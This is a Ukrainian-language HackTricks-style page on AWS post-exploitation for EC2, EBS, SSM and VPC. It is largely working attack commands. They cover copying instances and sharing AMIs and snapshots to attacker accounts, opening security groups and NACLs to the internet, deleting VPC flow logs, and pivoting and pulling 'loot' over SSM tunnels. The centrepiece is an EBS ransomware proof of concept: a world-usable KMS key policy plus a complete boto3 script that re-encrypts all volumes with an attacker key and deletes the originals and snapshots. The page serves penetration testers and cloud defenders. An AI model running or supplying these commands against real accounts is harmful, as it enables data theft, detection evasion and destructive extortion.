# AWS - EC2, EBS, SSM & VPC Постексплуатація

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Для додаткової інформації дивіться:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **duplicates inbound and outbound traffic for EC2 instances within a VPC** без потреби встановлювати щось на самих інстансах.\
Зазвичай цей дубльований трафік надсилається, наприклад, до системи виявлення вторгнень у мережу (IDS) для аналізу та моніторингу.\
Зловмисник може зловживати цим, щоб перехопити весь трафік і отримати з нього конфіденційну інформацію:

Для додаткової інформації дивіться на цій сторінці:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances зазвичай містять певну конфіденційну інформацію. Існують різні способи отримати доступ (перегляньте [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Однак інший спосіб перевірити, що в ньому міститься — **створити AMI і запустити з нього новий instance (навіть у власному акаунті)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### Дамп EBS Snapshot

**Snapshots — це резервні копії томів**, які зазвичай містять **чутливу інформацію**, тому їх перевірка зазвичай розкриває таку інформацію.\
Якщо ви знайдете **том без знімка**, ви можете: **створити знімок** і виконати наведені дії або просто **підмонтрувати його в інстанс** в акаунті:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Експортуйте EC2 AMI безпосередньо в S3 за допомогою `CreateStoreImageTask`, щоб отримати сирий диск-образ без шарингу знімка. Це дозволяє повну офлайн-форензику або викрадення даних, не змінюючи мережеві налаштування інстансу.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Підключіть io1/io2 Multi-Attach том до іншого інстансу та змонтуйте його тільки для читання, щоб витягти живі дані без створення знімків. Корисно, коли цільовий том вже має увімкнений Multi-Attach в тому ж AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Створіть EC2 Instance Connect Endpoint, дозволіть вхідний трафік і інжектуйте тимчасові SSH-ключі для доступу до приватних інстансів через керований тунель. Дає швидкі шляхи латерального руху без відкриття публічних портів.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Перенесіть вторинну приватну IP-адресу ENI жертви на ENI під контролем атакуючого, щоб видаватися за довірені хости, які дозволені за IP. Дозволяє обходити внутрішні ACLs або правила SG, прив'язані до конкретних адрес.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Пересв'яжіть Elastic IP від інстансу жертви на інстанс атакуючого, щоб перехоплювати вхідний трафік або ініціювати вихідні з'єднання, які виглядають як з довіреної публічної IP-адреси.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Якщо правило security group посилається на customer-managed prefix list, додавання CIDR-адрес атакуючого до цього списку непомітно розширює доступ для всіх залежних правил SG без зміни самої SG.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Створіть gateway або interface VPC endpoints, щоб відновити вихідний доступ з ізольованих підмереж. Використання AWS-managed private links обходить відсутні контролі IGW/NAT для ексфільтрації даних.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Атакуючий з дозволом ec2:AuthorizeSecurityGroupIngress може додавати inbound правила до security group (наприклад, дозволяючи tcp:80 з 0.0.0.0/0), тим самим відкриваючи внутрішні сервіси в публічний Інтернет або для несанкціонованих мереж.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Атакувальник, який має дозволи ec2:ReplaceNetworkAclEntry (або подібні), може змінити Network ACLs (NACLs) підмережі, зробивши їх дуже permissive — наприклад дозволивши 0.0.0.0/0 на критичних портах — що відкриває весь діапазон підмережі в Інтернет або для неавторизованих мережевих сегментів. На відміну від Security Groups, які застосовуються на рівні екземпляра, NACLs застосовуються на рівні підмережі, тому зміна обмежувального NACL може мати значно більший радіус ураження, дозволяючи доступ до значно більшої кількості хостів.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Зловмисник із дозволами ec2:Delete* та iam:Remove* може видаляти критичні ресурси інфраструктури та конфігурації — наприклад key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Це може спричинити негайне порушення роботи сервісів, втрату даних та втрату судово-експертних доказів.

Один приклад — видалення security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Налаштуйте VPC Flow Logs на відправку до attacker-controlled S3 bucket, щоб безперервно збирати мережеві метадані (source/destination, ports) за межами акаунта жертви для довготривалої розвідки.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Навіть якщо ви закриєте EC2 так, що з нього не виходить трафік, він все одно може **exfil via DNS**.

- **VPC Flow Logs не зафіксують цього**.
- Ви не маєте доступу до AWS DNS logs.
- Вимкніть це, встановивши "enableDnsSupport" в false за допомогою:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Зловмисник може викликати API endpoints акаунта, який він контролює. Cloudtrail зафіксує ці виклики, і зловмисник зможе побачити exfiltrate data у Cloudtrail logs.

### Open Security Group

Ви можете отримати додатковий доступ до мережевих сервісів, відкриваючи порти таким чином:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Можна запустити EC2 інстанс і зареєструвати його для запуску ECS інстансів, а потім викрасти дані цих ECS інстансів.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Видалити VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM перенаправлення портів

Потрібні дозволи:

- `ssm:StartSession`

Окрім виконання команд, SSM дозволяє тунелювання трафіку, що може бути використане для pivoting з EC2 інстансів, які не мають доступу до мережі через Security Groups або NACLs.
Один зі сценаріїв, де це корисно — pivoting з [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) до приватного кластера EKS.

> Щоб розпочати сесію, потрібно встановити SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Встановіть SessionManagerPlugin на вашому комп'ютері
2. Увійдіть на Bastion EC2, використовуючи наступну команду:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Отримайте тимчасові облікові дані Bastion EC2 AWS за допомогою скрипта [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Перенесіть ці облікові дані на власну машину в файл `$HOME/.aws/credentials` як профіль `[bastion-ec2]`
5. Увійдіть в EKS як Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Оновіть поле `server` у файлі `$HOME/.kube/config`, щоб воно вказувало на `https://localhost`
7. Створіть SSM тунель таким чином:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Трафік інструмента `kubectl` тепер пересилається тунелем SSM через Bastion EC2, і ви можете отримати доступ до приватного кластера EKS зі своєї машини, виконавши:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Зверніть увагу, що SSL-з'єднання зазнають невдачі, якщо ви не встановите прапорець `--insecure-skip-tls-verify` (або його еквівалент у K8s інструментах аудиту). Оскільки трафік тунелюється через захищений AWS SSM tunnel, ви захищені від будь-яких MitM-атак.

Нарешті, ця техніка не обмежується атакою приватних EKS-кластерів. Ви можете вказувати довільні домени та порти, щоб виконати pivot на будь-який інший AWS service або власний застосунок.

---

#### Швидке локальне ↔️ віддалене переадресування портів (AWS-StartPortForwardingSession)

Якщо вам потрібно переадресувати лише **один TCP-порт з EC2 інстансу на вашу локальну машину**, ви можете використати SSM документ `AWS-StartPortForwardingSession` (параметр remote host не потрібен):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Ця команда встановлює двонаправлений тунель між вашою робочою станцією (`localPortNumber`) та обраним портом (`portNumber`) на інстансі **без відкриття будь-яких вхідних правил Security-Group**.

Common use cases:

* **File exfiltration**
1. На інстансі запустіть швидкий HTTP-сервер, який обслуговує директорію, яку ви хочете exfiltrate:

```bash
python3 -m http.server 8000
```

2. З вашої робочої станції завантажте файли через SSM тунель:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Доступ до внутрішніх веб-застосунків (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Порада: Стисніть і зашифруйте докази перед ексфільтрацією, щоб CloudTrail не реєстрував незашифрований вміст:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Надання доступу до AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Пошук конфіденційної інформації в публічних і приватних AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel — це інструмент, призначений для **пошуку конфіденційної інформації в публічних або приватних Amazon Machine Images (AMIs)**. Він автоматизує процес запуску інстансів із цільових AMIs, підключення їхніх томів і сканування на наявність потенційних secrets або конфіденційних даних.

### Надати доступ до EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Доказ концепції, подібний до демонстрації Ransomware, наведеної в S3 post-exploitation notes. KMS варто перейменувати на RMS (Ransomware Management Service), бо ним дуже просто користуватися для шифрування різних сервісів AWS.

Спочатку з 'attacker' AWS акаунту створіть customer managed key у KMS. У цьому прикладі ми дозволимо AWS керувати даними ключа за нас, але в реалістичному сценарії зловмисник зберіг би дані ключа поза контролем AWS. Змініть key policy, щоб дозволити будь-якому AWS account Principal використовувати ключ. У цій key policy ім'я акаунту було 'AttackSim', а правило політики, що дозволяє повний доступ, називається 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Тепер, коли загальнодоступний ключ доступний для використання. Ми можемо використати 'victim' акаунт, у якому запущено кілька EC2 інстансів з приєднаними нешифрованими EBS томами. Саме EBS томи цього 'victim' акаунта є нашою метою для шифрування — ця атака відбувається за умови компрометації AWS акаунта з високими привілеями.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Схоже на приклад S3 ransomware. Ця атака створює копії приєднаних EBS томів за допомогою snapshots, використовує загальнодоступний ключ з 'attacker' акаунта для шифрування нових EBS томів, потім від'єднує оригінальні EBS томи від EC2 інстансів і видаляє їх, а вкінці видаляє snapshots, що використовувались для створення щойно зашифрованих EBS томів. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

В результаті в акаунті залишаться лише зашифровані EBS томи.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Також варто зауважити, що скрипт зупинив EC2 інстанси, щоб від'єднати і видалити оригінальні EBS томи. Оригінальні нешифровані томи тепер зникли.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Далі поверніться до key policy в 'attacker' акаунті і видаліть правило політики 'Outside Encryption' з key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Зачекайте деякий час, щоб щойно встановлена політика ключа поширилася. Потім поверніться в обліковий запис 'victim' і спробуйте приєднати один із щойно зашифрованих EBS volumes. Ви побачите, що можете приєднати том.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Але коли ви спробуєте фактично запустити EC2 instance з приєднаним зашифрованим EBS volume, він просто зазнає невдачі і буде переходити зі стану 'pending' назад у стан 'stopped' назавжди, оскільки приєднаний EBS volume не може бути розшифрований за допомогою ключа через те, що політика ключа більше цього не дозволяє.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Ось python-скрипт, який використовувався. Він приймає AWS creds для облікового запису 'victim' і загальнодоступне AWS ARN значення ключа, що використовуватиметься для шифрування. Скрипт створює зашифровані копії ВСІХ доступних EBS volumes, приєднаних до ВСІХ EC2 instances у цільовому AWS акаунті, після чого зупиняє кожен EC2 instance, від’єднує оригінальні EBS volumes, видаляє їх і нарешті видаляє всі snapshots, використані під час процесу. Це залишить у цільовому обліковому записі 'victim' лише зашифровані EBS volumes. КОРИСТУЙТЕСЯ ЦИМ СКРИПТОМ ЛИШЕ В ТЕСТОВОМУ СЕРЕДОВИЩІ — ВІН ДЕСТРУКТИВНИЙ І ВИДАЛИТЬ УСІ ОРИГІНАЛЬНІ EBS VOLUMES. Ви зможете відновити їх за допомогою застосованого KMS key і повернути в початковий стан через snapshots, але майте на увазі, що в підсумку це ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Посилання

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
